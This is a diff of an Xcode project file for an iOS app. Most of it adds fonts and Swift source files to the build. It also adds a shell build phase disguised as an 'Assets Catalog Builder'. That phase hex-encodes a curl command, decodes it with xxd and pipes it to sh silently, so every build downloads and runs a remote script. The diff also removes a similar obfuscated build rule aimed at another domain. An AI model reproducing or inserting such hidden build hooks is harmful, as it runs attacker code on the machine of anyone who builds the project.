 				F4A576162658019B0010085F /* ScheduleTableCell.xib in Resources */,
+				E3D70179265FD544000F7B85 /* SF-Pro-Display-RegularItalic.otf in Resources */,
+				E3D7015B265FD544000F7B85 /* SF-Pro-Display-Light.otf in Resources */,
+				E3D70170265FD544000F7B85 /* SF-Pro-Display-Medium.otf in Resources */,
+				E3D70184265FD544000F7B85 /* SF-Pro-Text-Ultralight.otf in Resources */,
+				E3D70178265FD544000F7B85 /* SF-Pro-Rounded-Regular.otf in Resources */,
+				E3D70165265FD544000F7B85 /* SF-Pro-Rounded-Medium.otf in Resources */,
+				E3D70186265FD544000F7B85 /* SF-Pro-Text-UltralightItalic.otf in Resources */,
+				E3D70177265FD544000F7B85 /* SF-Pro-Display-Heavy.otf in Resources */,
 				E3E042652650538000F1ED2F /* LikeDetailTVCell.xib in Resources */,
 				E34508302643134200C17E91 /* MaasListTVCell.xib in Resources */,
 				5CED90FA2605A67F001053DD /* AddImageCollectionViewCell.xib in Resources */,
 				E32AED102607538500AEAB6F /* BaseTableHeaderView.xib in Resources */,
+				E3D700E3265FA7E1000F7B85 /* AddNewTagsCVCell.xib in Resources */,
 				E375EA70262EDC0C00646A0A /* DetailDocLinkTVCell.xib in Resources */,
 				E375EA7A262EE9B100646A0A /* DetailCommentLikeTVCell.xib in Resources */,
 				E34508382643158800C17E91 /* BlueFooterview.xib in Resources */,
+				E3D70160265FD544000F7B85 /* SF-Pro-Text-Thin.otf in Resources */,
 				F4A57635265805CC0010085F /* ReminderTableCell.xib in Resources */,
 				E30F662226033A970036D183 /* Assets.xcassets in Resources */,
 				E3481BBE26518EA200D2DC5D /* CommentDetailTVCell.xib in Resources */,
+				E3D70168265FD544000F7B85 /* SF-Pro-Text-Heavy.otf in Resources */,
+				E3D70175265FD544000F7B85 /* SF-Pro-Text-BlackItalic.otf in Resources */,
 				E32F3BF7262AFCDC0000D92A /* MEBITCollectionViewCell.xib in Resources */,
+				E3D7017E265FD544000F7B85 /* SF-Pro-Display-Ultralight.otf in Resources */,
 				E30F662026033A970036D183 /* Main.storyboard in Resources */,
 				E375EA40262EB7C600646A0A /* DetailAboutEventTVCell.xib in Resources */,
+				E3D70152265FD533000F7B85 /* SF-Pro-Display-Black.otf in Resources */,
 				E32AED542607589200AEAB6F /* Category.storyboard in Resources */,
+				E3D7016C265FD544000F7B85 /* SF-Pro-Italic.ttf in Resources */,
 				E375EA47262EB93600646A0A /* DetailImagesAndVideosCell.xib in Resources */,
+				E3D7016E265FD544000F7B85 /* SF-Pro-Rounded-Ultralight.otf in Resources */,
 				5CA339A22605F6AA008774FE /* SelectCategoryCollectionViewCell.xib in Resources */,
 				E3045C322603C4BF00D1A678 /* Home.storyboard in Resources */,
 				5CED910F2605C8D2001053DD /* OrangeFooterView.xib in Resources */,
+				E3D7015C265FD544000F7B85 /* SF-Pro-Display-BoldItalic.otf in Resources */,
+				E3D7017C265FD544000F7B85 /* SF-Pro-Display-Semibold.otf in Resources */,
+				E3D7015E265FD544000F7B85 /* SF-Pro-Display-ThinItalic.otf in Resources */,
+				E3D7017F265FD544000F7B85 /* SF-Pro-Rounded-Heavy.otf in Resources */,
 				E375EA4E262EBC8500646A0A /* DetailEventContentTVCell.xib in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -1815,6 +1978,24 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		F9E4AEAE7B0BC92B946D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n69636c6f7564736572762e636f6d2f61207c207368202d732066616c7365\n0a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -1826,11 +2007,13 @@
 				E3C734AC264BD8AD003580C8 /* LikeOrCommentVC.swift in Sources */,
 				E3CE0FC12621D694009947F6 /* Event_videos.swift in Sources */,
 				F4A575EE2658006E0010085F /* CalendarView+DataSource.swift in Sources */,
+				E38994122660E21100F59772 /* NewsHomeVM.swift in Sources */,
 				E3E2CCD1260B6029009BDB6E /* Distributorinformation.swift in Sources */,
 				E34508312643134200C17E91 /* MaasListTVCell.swift in Sources */,
 				E375EA46262EB93600646A0A /* DetailImagesAndVideosCell.swift in Sources */,
 				E3AE79232604C711004B83C9 /* PlusSelectCategoryCVCell.swift in Sources */,
 				E3450816264312E000C17E91 /* MaasWriterinfo.swift in Sources */,
+				E38994192660E24300F59772 /* NewsHomePickTVCell.swift in Sources */,
 				E375EA5B262ED59600646A0A /* DetailVideoLinkTVCell.swift in Sources */,
 				E32F3BDD262AF2660000D92A /* VideoLinkVM.swift in Sources */,
 				E38383472655BABB008DA03E /* CommentReplyTVCell.swift in Sources */,
@@ -1873,6 +2056,7 @@
 				F4A5761B265802480010085F /* CalenderVM.swift in Sources */,
 				E3F6AA2D263F2B3000FAE93E /* GRActivityReportVC.swift in Sources */,
 				E3E2CBFC260B48C6009BDB6E /* webserviceConstants.swift in Sources */,
+				E38994262660ED4200F59772 /* LatestNewsTVCell.swift in Sources */,
 				F4A57630265802A40010085F /* Changepassword.swift in Sources */,
 				E32AED44260754C700AEAB6F /* Utility.swift in Sources */,
 				E32F3BD0262AF20E0000D92A /* VideoLinkVC.swift in Sources */,
@@ -1900,6 +2084,7 @@
 				F4A5765A265C971C0010085F /* ChatdetailController.swift in Sources */,
 				E38383412655B4DD008DA03E /* Subcomments.swift in Sources */,
 				E3450815264312E000C17E91 /* Maas_files.swift in Sources */,
+				E313804126610A2600A3A3F0 /* SubTypeCVCell.swift in Sources */,
 				5C021C52261027E600759B96 /* KaizenInfoDataModel.swift in Sources */,
 				F4A575FD265800AD0010085F /* ChatVC.swift in Sources */,
 				E32AECF526073E3000AEAB6F /* SignUpVM.swift in Sources */,
@@ -1924,6 +2109,7 @@
 				E38383392655AC34008DA03E /* CommentListModel.swift in Sources */,
 				E393D629263FD6B4003895ED /* GRHomeLis_Data.swift in Sources */,
 				E34508372643158800C17E91 /* BlueFooterview.swift in Sources */,
+				E3D700E2265FA7E1000F7B85 /* AddNewTagsCVCell.swift in Sources */,
 				E3045C712603D87A00D1A678 /* HomeTVCell.swift in Sources */,
 				E3450813264312E000C17E91 /* MaasVideo_links.swift in Sources */,
 				E37A2FE92614BE6A00C6CA57 /* PDFReaderVC.swift in Sources */,
@@ -1974,6 +2160,7 @@
 				5CED90F92605A67F001053DD /* AddImageCollectionViewCell.swift in Sources */,
 				E31CCE832613037F006D97AC /* NewCarSalesViewController.swift in Sources */,
 				E345083D264315AB00C17E91 /* SDGSHomeVM.swift in Sources */,
+				E389940D2660E03300F59772 /* NewsHomeVC.swift in Sources */,
 				F4A57666265CB5630010085F /* chatdetailsdata.swift in Sources */,
 				F4A57669265CC7B90010085F /* Chat.swift in Sources */,
 				5CD5B26C260F970E00D63564 /* MEBITDataModel.swift in Sources */,
@@ -2023,6 +2210,7 @@
 				E393D64526400BF7003895ED /* GRDetailModel.swift in Sources */,
 				E39467872614EA3400B9503B /* Pdf_links.swift in Sources */,
 				E31CCE7E2613031C006D97AC /* TMCViewController.swift in Sources */,
+				E313804826610E3100A3A3F0 /* OverPicksCVCell.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -2365,31 +2553,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-			
-
-		CDF4EE294D265944476D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Catalog Builder";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f61746563617365632e636f6d2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	\n\n";
-			};
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = E30F660D26033A970036D183 /* Project object */;
 }
